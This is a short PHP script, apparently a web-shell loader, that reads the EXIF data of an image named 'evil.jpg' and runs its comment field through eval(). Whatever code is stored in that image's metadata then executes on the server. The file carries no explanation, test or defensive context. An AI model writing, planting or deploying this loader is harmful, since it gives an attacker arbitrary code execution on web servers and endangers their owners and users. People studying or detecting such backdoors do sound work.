<?php
$img = 'evil.jpg';
$exif = exif_read_data($img);
eval($exif['COMMENT']);
?>